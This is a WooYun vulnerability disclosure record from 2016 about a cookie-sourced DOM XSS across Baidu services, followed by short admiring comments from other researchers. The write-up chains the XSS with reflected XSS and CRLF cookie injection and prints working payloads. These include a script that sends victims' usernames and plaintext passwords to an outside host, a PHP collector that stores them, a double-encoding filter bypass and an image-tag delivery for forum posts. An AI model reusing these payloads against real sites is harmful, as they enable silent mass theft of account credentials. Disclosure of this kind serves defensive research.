{"id": 74404, "wybug_id": "wooyun-2016-0170146", "wybug_title": "一个可大规模隐蔽窃取百度账号密码的漏洞(无需点击全线产品)", "wybug_corp": "百度", "wybug_author": "wolf", "wybug_date": "2016-01-15 16:14", "wybug_open_date": "2016-02-27 11:49", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-27：\t细节向公众公开  简要描述： xss rookit,百度基本所有核心业务均存在（百度贴吧，百度新闻，百度知道，百度百科，百度音乐等等等等），触发一次，全线中招。 详细说明：  在分析map.baidu.com时发现其代码会eval执行cookie PMS_JT的值\n\n测试\n\n添加PMS_JT的值为alert(1)，访问成功执行，确定存在cookie来源的dom xss漏洞，可构造形成xss rookit。在分析其他百度业务发现，这是一个通用的问题，基本所有的核心业务均存在这个问题。\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n如何体现危害呢，在http://wooyun.org/bugs/wooyun-2016-0167493已经描述，鉴于此漏洞还未公开这里再重新验证一遍先构造让其执行我们远端的js，方便测试。修改PMS_JT的值为\ndocument.write('<script src=\"//txt888.sinaapp.com/test.js\"></script>')\n或者\nvar%20element%3Ddocument.createElement%28%27script%27%29%3Belement.setAttribute%28%27src%27%2C%20%27http%3A%2f%2ftxt888.sinaapp.com%2ftest.js%27%29%3Bdocument.getElementsByTagName%28%22head%22%29.item%280%29.appendChild%28element%29%3B\n都可以\n\n成功执行触发首先要触发此漏洞的前提为能修改cookie的值,有2种漏洞组合可以触发此漏洞。第一种为利用反射型xss这里伏宸自动化渗透测试已找到多个baidu.com域下的xss漏洞，拿一个测试一下。http://m.apistore.baidu.com/astore/mfaqdetail/?tag=0&webTitle=APIStore%E4%BB%8B%E7%BB%8D<img src=1 onerror=alert(1)>先编写修改cookie jsbaidu_test.js\nfunction fSetCookie(c, e, d) {    var a = \";domain=\" + d +\";path=/\" ;    document.cookie = c + \"=\" + e + a + \";expires=\" + new Date(2099, 12, 31).toGMTString();}fSetCookie(\"PMS_JT\",\"document.write('<script src=\\\"//txt888.sinaapp.com/test.js\\\"></script>')\",\".baidu.com\")\n构造访问\nhttp://m.apistore.baidu.com/astore/mfaqdetail/?tag=0&webTitle=APIStore%E4%BB%8B%E7%BB%8D<srcipt src=\"//txt888.sinaapp.com/baidu_test.js\"></script>\n\n\n成功修改cookie值打开tieba.baidu.com 成功执行，其他业务也均成功触发\n\n继续构造，目标为窃取用户明文账号密码首先分析其登录框\n\n执行_.Module.use(\"common/widget/LoginDialog\", [\"\", \"userBar\"])时将加载登录框构造窃取代码baidu_rookit.js\nfunction login_jc(){    a = new Image();    a.src = \"http://txt888.sinaapp.com/form_save.php?user=\" + document.getElementById(\"TANGRAM__PSP_8__userName\").value + \"&password=\" + document.getElementById(\"TANGRAM__PSP_8__password\").value;     return true;}_.Module.use(\"common/widget/LoginDialog\", [\"\", \"userBar\"]);#加载登录框setTimeout(\"document.getElementById(\\\"TANGRAM__PSP_8__form\\\").setAttribute(\\\"onsubmit\\\",\\\"login_jc();\\\")\",5000);#5秒后增加onsubmit事件\n保存代码form_save.php\n<?phpfunction insert($data){    $mysql = new SaeMysql();    $sql = \"insert into test(`data`,`time`) values('$data',now())\";    $mysql->runsql($sql);    $mysql->closeDb();    if ($mysql->errno() != 0){    \tdie(\"Error:\" . $mysql->errmsg());\t}}if (count($_GET)>=1){    $data = json_encode($_GET);\tinsert($data);    echo 1;}?>\n\n\n打开登录测试，成功执行弹出登录框\n\n\n\n成功截取到密码使用反射型xss需被攻击者打开攻击链接，成功率与隐蔽性都不够，所以我们使用另一种漏洞来组合第二种为crlf漏洞这里伏宸自动化渗透测试平台也找到baidu.com域下多个crlf漏洞，拿一个测试根据漏洞构造添加cookie测试访问http://wenku.baidu.com:80/topic/new/href=/%0aset-cookie:future=123123; domain=.baidu.com; path=/%0aa:\n\n成功设置.baidu.com cookie，根域下所有子域名均可调用，所以只需激活一次，全线产品均可截取构造加载截取脚本\nhttp://wenku.baidu.com:80/topic/new/href=/%0aset-cookie:PMS_JT=document.write%28%27%3Cscript%20src%3D%22%2f%2f%2ftxt888.sinaapp.com%2fbaidu_rookit.js%22%3E%3C%2fscript%3E%27%29; domain=.baidu.com; path=/%0aa:\n\n\n成功设置，打开tieba.baidu.com 测试\n\n发现无任何反应，为什么呢再查看\n\n原来//被过滤成/了，导致无法加载我们远端的js如何绕过呢我们可以用双重编码的方式绕过构造\nhttp://wenku.baidu.com:80/topic/new/href=/%0aset-cookie:PMS_JT=document.write%28%27%3Cscript%20src%3D%22%252f%252ftxt888.sinaapp.com%2fbaidu_rookit.js%22%3E%3C%2fscript%3E%27%29; domain=.baidu.com; path=/%0aa:\n访问\n\n\n\n成功加载执行我们的截取代码因为crlf设置cookie为get请求，我们可以使用所有可以触发get请求的方式进行攻击，例如<img>标签<img src=\"http://wenku.baidu.com:80/topic/new/href=/%0aset-cookie:PMS_JT=document.write%28%27%3Cscript%20src%3D%22%252f%252ftxt888.sinaapp.com%2fbaidu_rookit.js%22%3E%3C%2fscript%3E%27%29; domain=.baidu.com; path=/%0aa:\">测试访问\n\n成功设置cookie也就是说只要能插入访问外部网络资源的地方就可以插入攻击代码(图片，视频，flash等等)，在受害者上网过程中不知不觉中就被窃取账号密码。测试例如DZ的论坛发帖或回帖插入图片，地址填\nhttp://wenku.baidu.com:80/topic/new/href=/%0aset-cookie:%20PMS_JT=document.write%28%27%3Cscript%20src%3D%22%252f%252ftxt888.sinaapp.com%2fbaidu_rookit.js%22%3E%3C%2fscript%3E%27%29;%20domain=.baidu.com;%20path=/%0aa:#.jpg\n注:空格都要转换为%20\n\n成功修改cookie\n\n测试登录\n\n成功截取到用户名以及明文密码信息其不同业务登录框均有细微不同，以上测试截取代码仅为tieba.baidu.com测试，若要全线窃取需编写判断执行不同的窃取代码。整理：攻击流程，在社交论坛，贴吧，空间等可添加外部资源的地方插入攻击代码(图片)，受害者在正常使用论坛查看帖子或其他无意中触发攻击代码，触发后其下次登录百度旗下存在漏洞产品时用户名密码将会被截取发送至攻击者指定的地址中。   漏洞证明：     修复方案：  严记只要是用户可以控制的变量都是有危害的。   版权声明：转载请注明来源 wolf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-01-15 22:46 厂商回复： 感谢您对百度安全的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-15 16:16 |    \t\t开心一下1313 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:20        | 喝口水,压压惊......)\t\t \n  感觉这个很吊！    \n     2016-01-15 16:18 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:376 漏洞数:76        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  火钳刘明    \n     2016-01-15 16:19 |    \t\t岛云首席鉴黄师 \t\t\t( 普通白帽子  |\t\t\t        Rank:460 漏洞数:125        | icisaw.cn 超低价虚拟主机VPS 购买返现 支...)\t\t \n  前排    \n     2016-01-15 16:20 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:711 漏洞数:73        | root@qisec.com)\t\t \n  林老板 6666    \n     2016-01-15 16:31 |    \t\t陆由乙 \t\t\t( 普通白帽子  |\t\t\t        Rank:445 漏洞数:104        | 我是突突兔！)\t\t \n  。。。    \n     2016-01-15 16:42 |    \t\t独臂刀王 \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:95        | 提交一个漏洞就可以买个柚子~~好爽~)\t\t \n  @DNS 表哥NB啊，都是表哥    \n     2016-01-15 17:02 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  给我玩玩    \n     2016-01-15 17:20 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:16        | 膜拜学习中)\t\t \n  NB 啊    \n     2016-01-15 17:29 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:283 漏洞数:111        | www.ixsec.org)\t\t \n  好叼    \n     2016-01-15 17:53 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1423 漏洞数:203        | 。)\t\t \n  大屌    \n     2016-01-15 18:06 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  百度钱包呢....    \n     2016-01-15 22:49 |    \t\t金馆长 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | Up)\t\t \n  吃惊    \n     2016-01-16 00:09 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:938 漏洞数:124        | 相濡以沫，不如相忘于江湖)\t\t \n  略屌    \n     2016-01-16 11:40 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  666666    \n     2016-01-16 14:24 |    \t\tsol0king \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:1        | 膜拜大牛)\t\t \n  赞一波    \n     2016-01-16 19:37 |    \t\tlanyan \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 啦啦啦啦啦 k哥成功和我混)\t\t \n  666    \n     2016-01-17 09:48 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  666    \n     2016-01-19 10:55 |    \t\tlk1ngaa7 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | hard rock)\t\t \n  赞    \n     2016-02-21 19:16 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  66666666666666应该和网易的一样，换了个思路    \n     2016-02-21 23:16 |    \t\tun10ad \t\t\t( 实习白帽子  |\t\t\t        Rank:43 漏洞数:11        | \\/\\/\\/)\t\t \n  爆炸    \n     2016-02-23 15:34 |    \t\tphoenixne \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:46        | 小本毕业，向各位学习)\t\t \n  虽然看不懂，但是感觉很厉害的样子。备份一下    \n     2016-03-01 18:10 |    \t\t风行者 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:7        | 程序员屌丝一枚)\t\t \n  好牛逼的样子。。。    \n     2016-03-01 18:12 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  非常666    \n     2016-03-01 23:45 |    \t\tysc917 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 仓也空井也空。。。)\t\t \n  流弊~~~    \n     2016-03-02 12:19 |    \t\tskyfall \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:9        | 小菜一枚，求大牛带我飞~)\t\t \n  6的飞起，mark一下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}